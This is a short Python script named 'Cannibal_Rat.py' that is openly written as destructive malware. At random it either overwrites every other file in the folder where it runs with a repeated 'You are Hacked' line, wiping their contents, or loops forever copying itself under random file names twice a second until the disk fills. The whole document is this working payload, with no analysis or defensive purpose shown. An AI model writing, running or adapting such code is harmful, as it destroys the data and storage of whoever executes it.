__author__ = 'Pratik_Munot'

import os
import shutil
import random
import time

def rat():
    files = os.listdir()
    files.remove('Cannibal_Rat.py')
    print(files)
    for file in files:
        #dirName = str(nam1) + nam2 + str(nam3)
        # os.mkdir(dirName)
        with open(file,'w') as fp:
            for i in range(25):
                fp.write('I am a creeper, catch me if u can. You are Hacked !!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n')

def replicator():
    while True:
        nam1 = random.randint(1, 1000)
        list1 = ['AA', 'BB', 'CC', 'DD', 'EE', 'FF', 'MM', 'NN', 'OO', 'PP', 'QQ', 'RR', 'SS']
        nam2 = random.choice(list1)
        nam3 = random.randint(1, 1000)

        dirName = str(nam1) + nam2 + str(nam3) + str(nam1) + nam2 + str(nam3) + str(nam1) + nam2 + str(nam3) + str(
            nam1) + nam2 + str(nam3)
        # os.mkdir(dirName)
        shutil.copy('Cannibal_Rat.py', dirName + '.py')
        time.sleep(0.5)

val=random.randint(1,2)
print(val)
if val==1:
    rat()
if val==2:
    replicator()
